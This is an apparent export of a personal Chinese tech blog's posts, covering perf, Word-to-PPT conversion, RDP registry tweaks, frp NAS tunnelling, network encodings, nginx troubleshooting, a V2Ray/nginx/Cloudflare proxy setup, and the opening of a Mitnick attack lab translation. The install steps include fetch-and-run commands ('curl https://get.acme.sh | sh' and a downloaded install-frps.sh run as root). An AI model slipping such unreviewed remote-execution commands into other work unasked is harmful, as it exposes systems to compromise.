PCI-MSI 131072-edge virtio5-config 35: 67 PCI-MSI 131073-edge virtio5-req.0 36: 0 PCI-MSI 81920-edge virtio2-config 37: 0 PCI-MSI 81921-edge virtio2-control 38: 0 PCI-MSI 81922-edge virtio2-event 39: 256 PCI-MSI 81923-edge virtio2-request NMI: 0 Non-maskable interruptsLOC: 132529595 Local timer interruptsSPU: 0 Spurious interruptsPMI: 0 Performance monitoring interruptsIWI: 0 IRQ work interruptsRTR: 0 APIC ICR read retriesRES: 0 Rescheduling interruptsCAL: 0 Function call interruptsTLB: 0 TLB shootdownsTRM: 0 Thermal event interruptsTHR: 0 Threshold APIC interruptsDFR: 0 Deferred Error APIC interruptsMCE: 0 Machine check exceptionsMCP: 7117 Machine check pollsHYP: 0 Hypervisor callback interruptsHRE: 0 Hyper-V reenlightenment interruptsHVS: 0 Hyper-V stimer0 interruptsERR: 0MIS: 0PIN: 0 Posted-interrupt notification eventNPI: 0 Nested posted-interrupt eventPIW: 0 Posted-interrupt wakeup event 3.短时应用排查3.1命令1234# 记录性能事件，等待大约15秒后按 Ctrl+C 退出$ perf record -g# 查看报告$ perf report]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[将word试题卷转换成ppt课件方法]]></title>
    <url>%2F2021%2F01%2F08%2F%E5%B0%86word%E8%AF%95%E9%A2%98%E5%8D%B7%E8%BD%AC%E6%8D%A2%E6%88%90ppt%E8%AF%BE%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[需求目前要录制试题讲解视频，所以要制作ppt课件。通过手动把试题添加到一张张幻灯片的方式效率过低，所以该文档讲述如何快速将word版本的试题卷转换成PPT幻灯片。 本文稿由展宏老师口述，本人编辑记录。 操作流程简介 word中的题目和选项需要区分，可以把题目设置为标题1，选项设置为标题2，形成分级的形式 在ppt中导入大纲格式的word 在母版视图中设置好版式（版式里面可以设置字体、颜色、字号、背景等），一次性应用于所有幻灯片 后续微调，最后保存 操作步骤：1.word设置 先从试卷编辑同事处获取从后台导出的word版试题卷 打开word文件后，先删除标题。 然后按ctrl+a选择剩下全部文字内容，设置为标题2 接下来需要让题目和答案选项区别开来，我们可以把每个题目都设置为标题1，但是如果想快速设置所有题目，那此处需要用到替换功能。使用替换功能，就需要观察每个题目的共同特点。比如此word中，我们发现，每个题目都会有“数字和、”连在一起。所以以此为依据进行替换 按ctrl+h将弹出替换窗口，先点击下【查找内容】旁的方框，让光标处于此处。然后点击【更多】，就能看到【搜索选项】。然后点击【特殊格式】 点击【特殊格式】后，选择【任意数字】，会出现如下图所示^# 然后再补上一个、号。此时【查找内容】就设置完毕了 再用鼠标点击【替换为】旁的方框，让光标处于此处。然后再点击【格式】，选择弹出框中的【样式】 点击【样式】后，会弹出【替换样式】框，然后选择【标题1】，再点击【确定】 最后点击【全部替换】 替换完后，效果如下图所示。可以看到导航窗口内，题目和问题是变成分级结构了。 此时保存文件。可以选择另存为的方式保存。这里主要是考虑到后台导出的word文件实际是html格式，所以需要改为word的doc或docx格式。注意：自己要记得另存为文件后的存放路径 保存完毕后，关闭word文件。记得要关闭！！！！ 2.ppt设置 新建一个ppt 选择【开始】—【新建幻灯片】—【幻灯片（从大纲）】 选择刚刚保存的doc文件，点击【插入】 效果如下图所示 接下来我们需要微调，先选中【视图】—【幻灯片母版】 在【幻灯片母版】—【幻灯片大小】处可以调整ppt比例 在下图示界面中，删除所有版式，删不动的就可以不删。 删除完后，只会留下两个版式 我们打开一份平常的课件ppt，需要把我们的背景图贴上去。同样的，我们打开日常课件后，先选中【视图】—【幻灯片母版】，然后右键复制一份箭头所指的版式。 复制的版式，粘贴到我们的试题ppt上，得到如图所示 选择第二张版式，然后复制里面的内容，到我们的背景图版式中去 接下来我们可以调整文字的展示效果。把最下方的红框内三个虚线框删除 调整问题的字体颜色，字号等，这里按自己需求设置 调整答案选项的字体颜色，字号等，这里按自己需求设置，同时没必要有项目符号，所以取消勾选 退出母版视图 在左侧边框随意选中一个幻灯片，然后按ctrl+a选中所有幻灯片。右键鼠标，选择【版式】，然后选择有我们背景图的那个版式。 最终效果如下 3.完成新建的ppt就已经全部完成。此时对于部分幻灯片内的内容可能需要自己后续手动再微调下，再有就是word中的图片是没有导入到ppt内的，所以需要你自己复制word中的试题图片然后粘贴到ppt内。 问题在用ppt导入word文件时出现报错，如下图所示： 解决办法如下：不用ppt导入word了，而是改成在word中直接发送到ppt内 打开word，点击“文件”菜单。 点击页面左下角的“选项” 进入选项页面后，点击“快速访问工具栏” 再在上方下拉菜单选择“不在功能区中的命令”，然后，下拉选择“发送到Microsoftpownpoint＂，点击中间的“添加” 添加成功后，在word的上面的工具栏中，会出现“发送到Microsoftpownpoint”的按钮，点击它。 此时将进入打开PPT的界面。即进入到了【操作步骤】中的【2.ppt设置】]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关闭UDP登陆远程桌面]]></title>
    <url>%2F2020%2F12%2F30%2F%E5%85%B3%E9%97%ADUDP%E7%99%BB%E9%99%86%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[1.现象及猜测windows VPS部署在国外，需要通过远程桌面的方式进行登陆。在连接过程中会产生卡顿，极大限度影响操作。查看桌面上的连接提示，说是尝试使用了UDP登陆。 但是我有一台线路良好的中转服务器把流量转发到windows vps上，转发的是TCP流量。怀疑是使用远程登陆的过程中，本地使用了udp协议连接到windows VPS，导致流量没有走中转服务器转发。同时udp被qos，导致访问出现卡顿现象。 2.本地电脑禁用UDP方式登陆远程桌面 因为是win10家庭版电脑，无法打开组策略，所以通过修改注册表（运行—regedit）的方式关闭udp 此策略设置指定是否使用 UDP 协议以通过远程桌面协议访问服务器。 如果启用此策略设置，则远程桌面协议流量仅使用 TCP 协议。 如果禁用或未配置此策略设置，则远程桌面协议流量将尝试同时使用 TCP 和 UDP 协议。 Registry Hive HKEY_LOCAL_MACHINE Registry Path SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\Client Value Name fClientDisableUDP Value Type REG_DWORD Enabled Value 1 Disabled Value 0 关闭udp后，果然问题解决。]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[威联通frp内网穿透]]></title>
    <url>%2F2020%2F11%2F21%2F%E5%A8%81%E8%81%94%E9%80%9Afrp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%2F</url>
    <content type="text"><![CDATA[1.概述该篇文档为自己所做笔记，防止后续忘记如何部署。 1、没有公网IP想要访问内网的NAS 2、通过VPS搭建Frp服务来访问NAS 2.FRP服务器安装2.1 服务器部署 命令行中，输入以下命令，并回车。直接复制即可。 12345wget --no-check-certificate https://raw.githubusercontent.com/clangcn/onekey-install-shell/master/frps/install-frps.sh -O ./install-frps.shchmod 700 ./install-frps.sh./install-frps.sh install 安装过程一些注意项如下，其他的项可以默认就行。 12345678910111213141516171819202122Please select frps download url:[1].aliyun (default)[2].githubEnter your choice (1, 2 or exit. default [aliyun]): y #选择frp服务器端下载地址，默认阿里云Please input frps bind_port [1-65535](Default Server Port: 5443): #输入frp提供服务的端口，用于服务器端和客户端通信（这个要记住）Please input frps dashboard_port [1-65535](Default dashboard_port: 6443): #输入frp的控制台服务端口，用于查看frp工作状态（IP+端口就可以登录）Please input frps vhost_http_port [1-65535](Default vhost_http_port: 80): #输入frp进行http穿透的http服务端口（这个要注意威联通默认是8080端口，Qfile等客户端配置的时候要与这个对应起来）Please input frps vhost_https_port [1-65535](Default vhost_https_port: 443): #输入frp进行https穿透的https服务端口Please input dashboard_user (Default: admin): #输入frp控制台管理用户名Please input dashboard_pwd (Default: JUqYheKf): #输入frp控制台管理码，默认是随机生成的（修改成自己的便于查看控制台）Please input privilege_token (Default: WEWLRgwRjIJVPx2kuqzkGnvuftPLQniq): #输入frp服务器和客户端通信的密码，默认是随机生成的Please input frps max_pool_count [1-200](Default max_pool_count: 50): #设置每个代理可以创建的连接池上限，默认50Please input frps log_max_days [1-30](Default log_max_days: 3 day): #设置日志保留天数，范围是1到30天，默认保留3天。##### Please select log_file #####1: enable2: disable#####################################################Enter your choice (1, 2 or exit. default [1]): #设置是否开启日志记录，默认开启，开启后日志等级及保留天数生效，否则等级和保留天数无效 注意放通服务器端口 FRP命令说明 123456./install-frps.sh update 更新./install-frps.sh uninstall 卸载frps start 启动服务frps stop 停止服务frps restart 重启服务frps version 版本查看 3. 威联通客户端配置 进入container station 在【镜像文件】中，如图设置，在镜像文件名称中输入qinmenghua/frpc 提取处镜像后，会有一个镜像文件。点击该镜像旁边的+号，然后如图设置。红框处是设置配置文件位置。默认是/home目录下 在弹出的框中，如图设置 在【共享文件夹】中的【挂载本机共享文件夹】选择自己提前创建好的目录，后续配置文件frpc.ini真实的放置在这个文件夹下。在【挂载路径】中设置配置文件的文件夹，这个文件夹是不需要你手动把文件放进去的。最后点击创建。 在container station中启动docker 4.创建配置文件12345678910111213141516171819202122232425[common]server_addr = #为服务端IP地址，填入即可。server_port = 9999 #为服务器端口，填入你设置的端口号，就是那个Bind porttoken = #是你在服务器上设置的连接口令token[Qnas] #自定义服务项type = http #链接模式local_ip = 192.168.1.8 #本地NAS的iplocal_port = 8080 #NAS链接端口use_gzip = trueuse_encryption = truepool_count = 20privilege_mode = truecustom_domains = #有域名可以填写[Qnas2] #自定义服务项type = https #链接模式local_ip = 192.168.1.8 #本地NAS的iplocal_port = 443 #NAS链接端口use_gzip = trueuse_encryption = truepool_count = 20privilege_mode = truecustom_domains = #有域名可以填写 配置文件需要命名为frpc.ini 注意事项：配置文件中的注释需要删除掉，不然会在docker中报错。 5.问题在客户端上启动服务后，出现过报错login to server failed: i/o deadline reached 网上查找资料没有解决。重启了下服务器后，居然就能连上了。。。。。。]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网络安全设备基础]]></title>
    <url>%2F2020%2F09%2F21%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[本系列视频观看地址：Networking Security Devices 1.IDS and IPS入侵检测设备与入侵防御设备 An intranet is a private network which is heavily protected by many different networking devices, such as router, firewall, proxy server, honeynet, DMZ, IPS and IDS. This diagram is an overly-simplified version of the reality. I try to put these devices together in a reasonable order, only for teaching and learning purpose. Today my topic is IDS and IPS. IDS stands for Intrusion-Detection System. The system is often deployed on the network,close to the perimeter. It is very much like a CCTV camera above a business entrance or sensors on its doors. IDS is a passive system that scans incoming traffic. Once the IDS identified dangerous or suspicious traffic,it can send alerts but leaves the action to IPS. IPS stands for Intrusion Prevention System. Unlike IDS, IPS is able to actively block or prevent intrusions. It means IPS takes action: 1) Inspection and investigation: Inspection can include signature-based inspection and statistical anomaly-based inspection. Investigation includes analyzing suspicious packets and activities. 2)Action: once unwelcome packets are identified, IPS would either put them in quarantine, or simply drop them. 3) Logs and reports: Like many security devices,IPS can log attacks and send reports Keep in mind,IDS and IPS are not necessarily two separate physical devices. They can be combined into one device. They can be also combined with other devices,such as firewall,router, or proxy, into a single device. Unified Threat Management (UTM) and next-generation firewalls are two examples.]]></content>
      <categories>
        <category>英语</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站收集]]></title>
    <url>%2F2020%2F08%2F19%2F%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[收录学习过程中觉得不错的文档或网站 1.网络基本功计算机网络——TCP拥塞控制 朱双印的博客 曹世宏的博客 面试准备 TCP 知识，看这一篇就够了 详解 TCP 三次握手、四次挥手，附带精美图解和超高频面试题 HTTPS 详解一：附带最精美详尽的 HTTPS 原理图 HTTPS详解二：SSL / TLS 工作原理和详细握手过程 详解IPSec VPN 2.网络安全【漏洞日记】深信服EDR 吾还没见过，就听说被人日穿了 3.编程相关浅谈轻量化的虚拟技术- Docker容器 4.学习方法How to escape tutorial purgatory as a new developer — or at any time in your career. 5.测试工具FOFA:是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。 FOFA使用说明 ping test ip查询]]></content>
      <categories>
        <category>网站收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编码]]></title>
    <url>%2F2020%2F08%2F12%2F%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[通信线路的编码就像商品的包装，商品包装的目的是使商品更适合运输，在运输过程中不受损，同样，线路编码的目的就是使编码后的二进制数据更适合线路传输。 物理层的编码可以分为两类。一类是和物理介质相关，常用的光接口码型有NRZ、NRZI；电接口码型有HDB3、BnZS、CMI、Manchester、MLT-3。另一类和物理介质无关，比如百兆以太网用的4B/5B编码，千兆以太网用的8B/10B编码，万兆以太网用的64B/66B编码。 物理介质相关编码NRZ码：NRZ即Non-Return to Zero Code, 非归零码，光接口STM-NO、1000Base-SX、1000Base-LX采用此码型。NRZ是一种很简单的编码方式，用0电位和1电位分别二进制的“0”和“1”，编码后速率不变，有很明显的直流成份，不适合电接口传输。 NRZ的问题是，几个连续的1表示在一段时间内信号在链路上保持为高电平，类似地，几个连续0表示信号在一段时间内保持为低电平。一长串0和1导致两个基本问题。第一个问题是，它会导致基线漂移（baseline wander）状态。尤其是接收方保持一个它所看到的信号平均值，然后用这个平均值区分高、低电平。当收到的信号远低于这个平均值时，接收方就断定看到了0，同样，远高于这个平均值的信号被认为是1。当然，问题是太多连续的1或0会使这个平均值发生改变，使得检测信号中很难出现明显的变化。 第二个问题是，由高到低和由低到高的频繁转换必须使用时钟恢复（clock recovery）。直观地讲，时钟恢复问题就是：编码和解码过程都由一个时钟来驱动，每个时钟周期发送方发送1比特，接收方恢复1比特。为了使接收方能恢复发送方发送的比特，发送方和接收方的时钟必须精确同步。如果接收方时钟比发送方时钟稍快或稍慢，那么，接收方就不能正确地解码信号。可以采用在另一条线上发送时钟给接收方的方法，但这种方案不太可行，因为这使布线费用增加一倍，所以接收方改由收到的信号得到时钟，这就是时钟恢复过程。无论何时，只要信号有从1到0或从0到1的跳变，接收方就知道这是在时钟周期的边界上，它能够自己进行重新同步。然而，若长时间没有这样的跳变就会导致时钟漂移。所以，无论传送什么数据，时钟恢复都依赖于信号内有许多跳变。 下图以图解方式描述了一个特定的比特序列（图的上部）及其对应的NRZ编码信号（图的下部）。 NRZI码：有一种方法可以解决上述问题，称为不归零反转（NonReturn to Zero Inverted，NRZI）。光接口100Base-FX使用此码型。编码不改变信号速率。发送方将当前信号的跳变编码为1，将当前信号的保持编码为0。这样就解决了连续1的问题，但是显然未解决连续0的问题。NRZI如下图所示。还有一种方法称为曼彻斯特编码（Manchester encoding），这种颇具独创性的方法通过传输NRZ编码数据与时钟的异或值使时钟与信号结合在一起。（把本地时钟看作一个从低到高变化的内部信号，一对低/高变化的电平看作一个时钟周期。）下图也给出了曼彻斯特编码。注意，曼彻斯特编码将0作为由低到高的跳变，1作为由高到低的跳变（定义也可以相反）。因为0和1都导致信号的跳变，所以接收方能有效地恢复时钟。（还有一种曼彻斯特编码的变种，称为差分曼彻斯特（differential Manchester）编码。其方法是若信号的前一半与前一比特信号的后一半信号相等则编码为1，若信号的前一半与前一比特信号的后一半信号相反则编码为0。） 曼彻斯特编码方案存在的问题是使链路上信号跳变的速率加倍，这意味着接收方有一半的时间在检测信号的每一个脉冲。信号变化的速率称为链路的波特率（baud rate）。在曼彻斯特编码中，比特率是波特率的一半，所以认为编码的效率仅为50%。记住，如果接收方保持比上图中的曼彻斯特编码要求的更快的波特率，那么在相同的时间段中，NRZ和NRZI能传输2倍的比特数。 NRZI编码规则：1).如果下一个输入二进制位是“1”，则下一个编码后的电平是当前电平跳变后的电平；2).如果下一个输入二进制位是“0”，则编码后的电平与当前保持一致。 NRZ和NRZI都是单极性码，即都只有正电平和零电平，没有负电平，所以NRZ和NRZI码中有很多直流成份，不适合电路传输，并且NRZ和NRZI编码本身不能保证信号中不包含长连“0”或长连“1”出现，不利于时钟恢复。 MLT-3码：MLT-3即Multi-Level Transmit -3，多电平传输码，MLT-3码跟NRZI码有点类型，其特点都是逢“1”跳变，逢“0”保持不变，并且编码后不改变信号速率。如NRZI码不同的是，MLT-3是双极性码，有”-1”、“0”、“1”三种电平，编码后直流成份大大减少，可以进行电路传输，100Base-TX采用此码型。MLT-3编码规则：1).如果下一输入为“0”，则电平保持不变；2).如果下一输入为“1”，则产生跳变，此时又分两种情况。 (a).如果前一输出是“＋1”或“－1”，则下一输出为“0”； (b).如果前一输出是“0”，其信号极性和最近一个非“0”相反。 物理介质无关编码什么是4B/5B编码？ 4B/5B编码是百兆以太网（即快速以太网）中线路层编码类型之一，就是用5bit的二进制数来表示4bit二进制数，映射方式如下表所示： 为什么要进行4B/5B编码？ 在通信网络中，接收端需要从接收数据中恢复时钟信息来保证同步，这就需要线路中所传输的二进制码流有足够多的跳变，即不能有过多连续的高电平或低电平，否则无法提取时钟信息。Manchester（曼切斯特）编码可以保证线路中码流有充分的跳变，因为它是用电平从“-1”到“+1”的跳变来表示“1”，用电平从“+1”到“-1”的跳变来表示“0”，但是这种编码方式的效率太低，只有50%，相当于用线路的有效带宽来换取信号的跳变，十兆以太网就是使用Manchester编码，虽然线路的有效带宽只有10Mbps，但实际带宽却是20Mbps。百兆以太网用的4B/5B编码与MLT-3编码组合方式，发送码流先进行4B/5B编码，再进行MLT-3编码，最后再上线路传输；千兆以太网用的是8B/10B编码与NRZ编码组合方式；万兆以太网用的是64B/66B编码；PCIE 3.0用的是128B/130B编码。 4B/5B编码规则有哪些？4B/5B编码其实就是用5bit的二进制码来代表4bit二进制码。此编码的效率是80%，比Manchester码高。4B/5B编码的目的在前面已经说过了，就是让码流产生足够多的跳变。4位二进制共有16种组合，5位二进制共有32种组合，如何从32种组合种选取16种来使用呢？这里需要满足两个规则：1). 每个5比特码组中不含多于3个“0”；2). 或者5比特码组中包含不少于2个“1”； 此规则是怎么来的？这就要从MLT-3码的特点来解释了。MLT-3码的特点简单的说就是：逢“1”跳变，逢“0”不跳变。为了让4B/5B编码后的码流中有足够多的跳变就需要编码后的码流中有尽量多的“1”和尽量少的“0”。这种编码的特点是将欲发送的数据流每4bit作为一个组，然后按照4B/5B编码规则将其转换成相应5bit码。5bit码共有32种组合，但只采用其中的16种对应4bit码的16种，其他的16种或者未用或者用作控制码，以表示帧的开始和结束、光纤线路的状态（静止、空闲、暂停）等。三种应用实例是FDDI、100BASE－TX和100BASE－FX.8B/10B编码与4B/5B的概念类似，例如在千兆以太网中就采用了8B/10B的编码方式。 在通信系统中，通信速度与线路传输中的调制速率，所谓调制速率是指单位时间内线路状态变化的数目，以波特(baud)为单位。如果采用曼彻斯特编码，在每个调制时间间隔内跳动两次，则数据传送速率是波特率的二分之一。在快速以太网中，数据传输速率为100Mbps，如果采用曼彻斯特编码，波特率将达200M波特，对传输介质和设备的技术要求都将提高，增大了传输成本。如果使用4B/5B编码，在传输速率为100Mbps的情况下，其调制速率为：100M÷(4/5)＝125M(baud)。即波特率为125M baud，大大低于曼彻斯特编码时的200M baud，这样就在快速以太网中使用非屏蔽双绞线成为可能。 参考连接： 1.通讯线路编码类型总结 2.4B/5B编码原理 3.编码（NRZ、NRZI、曼彻斯特、4B/5B）]]></content>
      <categories>
        <category>软考</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Nginx无法启动问题解决]]></title>
    <url>%2F2020%2F06%2F03%2FNginx%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[问题：Nginx写好配置文件后，启动时报错 报错提示： 1Job for nginx.service failed because the control process exited with error code. See &quot;systemctl status nginx.service&quot; and &quot;journalctl -xe&quot; for details. 问题出现原因：创建配置文件是在/etc/nginx/conf.d/这个目录下，文件名是：default.conf，使用/etc/init.d/nginx reload 命令时提示的错误 配置文件内容： 123456789101112131415161718192021server &#123; listen 443 ssl; server_name xxx.dilidonglong.site; #修改为自己的域名 ssl_certificate ssl/xxx.dilidonglong.site.crt; #修改为自己的域名 ssl_certificate_key ssl/xxx.dilidonglong.site.key; #修改为自己的域名 location /yuuka &#123; #修改为你自己的路径，需要和V2RAY里面的路径一样 proxy_redirect off; proxy_pass http://127.0.0.1:210; #修改为你自己的v2ray服务器端口 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 60s; proxy_read_timeout 86400s; proxy_send_timeout 60s; &#125; &#125; 解答经过：​ 网上说这种错误一般都是目录不存在或者权限不足，所以直接执行下面两条命令即可，结果发现根本行不通。 12[root@typecodes ~]# cd /var/tmp/[root@typecodes ~]# mkdir -p /var/tmp/nginx/&#123;client,proxy,fastcgi,uwsgi,scgi&#125; 最终解决办法：​ 1. 使用以下命令，得到错误提示如下： 12345678910111213141516[root@ecs-u4x ~]# systemctl status nginx.service● nginx.service - The nginx HTTP and reverse proxy server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: failed (Result: exit-code) since Tue 2020-06-02 15:22:46 CST; 1min 13s ago Process: 14014 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=1/FAILURE) Process: 14012 ExecStartPre=/usr/bin/rm -f /run/nginx.pid (code=exited, status=0/SUCCESS) Main PID: 9181 (code=exited, status=0/SUCCESS)Jun 02 15:22:46 ecs-u4x systemd[1]: Starting The nginx HTTP and reverse proxy server...Jun 02 15:22:46 ecs-u4x nginx[14014]: nginx: [emerg] cannot load certificate "/etc/nginx/ssl/xxx.dili...file)Jun 02 15:22:46 ecs-u4x nginx[14014]: nginx: configuration file /etc/nginx/nginx.conf test failedJun 02 15:22:46 ecs-u4x systemd[1]: nginx.service: control process exited, code=exited status=1Jun 02 15:22:46 ecs-u4x systemd[1]: Failed to start The nginx HTTP and reverse proxy server.Jun 02 15:22:46 ecs-u4x systemd[1]: Unit nginx.service entered failed state.Jun 02 15:22:46 ecs-u4x systemd[1]: nginx.service failed.Hint: Some lines were ellipsized, use -l to show in full. 根据错误提示发现Jun 02 15:22:46 ecs-u4x nginx[14014]: nginx: [emerg] cannot load certificate &quot;/etc/nginx/ssl/xxx.dili...file)，这表明无法加载/etc/nginx/ssl/xxx……这个证书文件。于是查看了下/etc/nginx/ssl/目录下的文件，发现只有dilidonglong开头的证书文件，而没有xxx.dilidonglong开头的证书文件。 于是把default.conf配置文件中的域名里的xxx.dilidonglong全部删掉xxx.。然后再重启Nginx服务，问题解决。 反思：​ 多看英文，多看错误提示！]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[协议躲喵喵]]></title>
    <url>%2F2020%2F05%2F16%2F%E5%8D%8F%E8%AE%AE%E8%BA%B2%E5%96%B5%E5%96%B5%2F</url>
    <content type="text"><![CDATA[1.概述本次躲喵喵使用websocket+tls+web方式。我们先要搭建一个网站，而V2Ray客户端访问网站的特定路径时能实现科学飞飞飞。在浏览器上打开网页时会显示bad request，当然也可以搭建一个简单网站。 前期需要准备的内容如下： 1.域名与CDN，由于使用了cloudflare，所以需要在cloudflare上做A记录。 2.服务器上开启BBR 3.服务器上搭建了V2Ray 2.V2Ray服务器配置文件内容修改配置文件/usr/local/etc/v2ray/config.json，内容如下： 123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;inbounds&quot;: [&#123; &quot;port&quot;: xxxxx, //此处为安装时生成的端口，可修改随意，但是保证和下面提到的端口号相同 &quot;listen&quot;:&quot;127.0.0.1&quot;, //设置了监听地址后，后续在客户端上直接使用服务器IP是无法连接成功的 &quot;protocol&quot;: &quot;vmess&quot;, &quot;settings&quot;: &#123; &quot;clients&quot;: [ &#123; &quot;id&quot;: &quot;xxxxxxxxx&quot;, //此处为安装时生成的id &quot;level&quot;: 1, &quot;alterId&quot;: 64 //此处为安装时生成的alterId &#125; ] &#125;, &quot;streamSettings&quot;: &#123; &quot;network&quot;: &quot;ws&quot;, &quot;wsSettings&quot;: &#123; &quot;path&quot;: &quot;/xxx&quot; //此处为路径，需要和下面NGINX上面的路径配置一样 &#125; &#125; &#125;], &quot;outbounds&quot;: [&#123; &quot;protocol&quot;: &quot;freedom&quot;, &quot;settings&quot;: &#123;&#125; &#125;,&#123; &quot;protocol&quot;: &quot;blackhole&quot;, &quot;settings&quot;: &#123;&#125;, &quot;tag&quot;: &quot;blocked&quot; &#125;], &quot;routing&quot;: &#123; &quot;rules&quot;: [ &#123; &quot;type&quot;: &quot;field&quot;, &quot;ip&quot;: [&quot;geoip:private&quot;], &quot;outboundTag&quot;: &quot;blocked&quot; &#125; ] &#125;&#125; 修改完配置后，记得重启V2Ray使配置生效。 3.安装Nginx3.1 Nginx初步安装 安装Nginx软件包： yum install epel-release yum install nginx 启动Nginx systemctl start nginx 测试启动是否生效可以使用命令 curl -I 127.0.0.1 设置开机自启 systemctl enable nginx 在nginx安装目录下创建ssl文件夹 mkdir /etc/nginx/ssl 编辑配置文件vi /etc/nginx/conf.d/default.conf 123456789101112131415161718192021server &#123; listen 443 ssl; server_name xilearn.top; #修改为自己的域名 ssl_certificate ssl/xilearn.top.crt; #修改为自己的域名 ssl_certificate_key ssl/xilearn.top.key; #修改为自己的域名 location /xxx &#123; #修改为你自己的路径，需要和V2RAY里面的路径一样 proxy_redirect off; proxy_pass http://127.0.0.1:xxxxxx; #修改为你自己的v2ray服务器端口 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "upgrade"; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 60s; proxy_read_timeout 86400s; proxy_send_timeout 60s; &#125; &#125; 3.2 生成ssl/tls证书并配置3.2.1 设置DNS 注册一个cloudflare账号，添加自己已注册的域名，注意将域名A记录的Proxy status设置为橙色云朵状态，这样才会走cloudflare的CDN，如果设置为灰色云朵状态，表示不走cloudflare的CDN，而是域名直连你自己的服务器，然后在你的域名注册服务商那里将域名的dns服务器修改为cloudflare提供的dns。 点击cloudflare的SSL/TLS菜单，在SSL的那一栏，将右侧的下拉框设置为Full（Full表示客户端-&gt;CDN，CDN-&gt;服务器的数据传输都加密），默认为Flexible（Flexible表示客户端-&gt;CDN加密，CDN-&gt;服务器不加密），因为服务器已经开启了tls，所以这里需要设置为Full。 3.2.2 设置API TOKEN 访问 https://dash.cloudflare.com/profile/api-tokens 添加一个API TOKEN，设置Zone.Zone的读权限以及Zone.DNS的写权限，等会会用到这个API TOKEN。如下图： 3.2.3 找到Key 3.2.4 找到账号ID登陆cloudflare后，在导航栏可以看到ID，红框内即是账号ID 3.2.5 配置acme 在cloudflare设置好后，接下来再在服务器上输入下列命令 1234567[root@ecs-M79hl ~] yum install -y socat[root@ecs-M79hl ~] curl https://get.acme.sh | sh[root@ecs-M79hl ~] source ~/.bashrc[root@ecs-M79hl ~] export CF_Token="3.2.2步"[root@ecs-M79hl ~] export CF_Key="3.2.3步"[root@ecs-M79hl ~] export CF_Account_ID="3.2.4步"[root@ecs-M79hl ~] export CF_Email="xxxx@xx.com" 3.2.6 使用 letsencrypt 证书12acme.sh --set-default-ca --server letsencrypt# 设置默认的证书颁发机构（CA）和服务器为letsencrypt 3.2.7 签发证书12345[root@ecs-M79hl ~]acme.sh --issue --dns dns_cf -d xilearn.top -d xxx.xilearn.top -k ec-256[root@ecs-M79hl ~]cat ~/.acme.sh/xilearn.top_ecc/fullchain.cer &gt; /etc/nginx/ssl/xilearn.top.crt[root@ecs-M79hl ~]cat ~/.acme.sh/xilearn.top_ecc/xilearn.top.key &gt; /etc/nginx/ssl/xilearn.top.key[root@ecs-M79hl ~]systemctl restart nginx[root@ecs-M79hl ~]acme.sh --installcert -d xilearn.top -d zgo.xilearn.top --fullchainpath /etc/nginx/ssl/xilearn.top.crt --keypath /etc/nginx/ssl/xilearn.top.key --ecc --reloadcmd "systemctl reload nginx" 4.客户端配置]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[米特尼克攻击实验]]></title>
    <url>%2F2020%2F05%2F13%2F%E7%B1%B3%E7%89%B9%E5%B0%BC%E5%85%8B%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[官方原文档 The Mitnick Attack Lab米特尼克攻击实验 1.Overview（概览）Kevin Mitnick is probably one of the most well-known hackers in USA. He was on FBI’s wanted list of criminals（犯罪分子）. While on the run, he became interested in hacking cellular（细胞） phone networks, and was in need for specialized software that could help him do that. That led him to Tsutomu Shimomura, a researcher working at the San Diego Supercomputer Center, who was one of the leading researchers on the security of cellular phone networks. He had the code that Mitnick wanted. 凯文·米特尼克可能是美国最为著名的黑客之一，他的名字被列入联邦调查局的通缉犯名单中。在他逃跑期间，他对入侵手机网络产生了兴趣，并且他需要一个特殊的软件以帮助他来完成这些工作。这让他找到了下村努（日裔美籍的电脑安全专家、计算物理学专家，2008年诺贝尔化学奖得主下村修的儿子），一名工作于圣地亚哥超级计算中心的研究员，他是在移动手机网络安全的领先研究员之一。他拥有米特尼克所想要的代码。 In 1994, Mitnick successfully launched（发射，开展） an attack on Shimomura’s computer, by exploiting（利用） the vulnerabilities（Vulnerability漏洞） in the TCP protocol and the trusted relationship between two of Shimomura’s computers. The attack triggered a dramatic（戏剧性地） 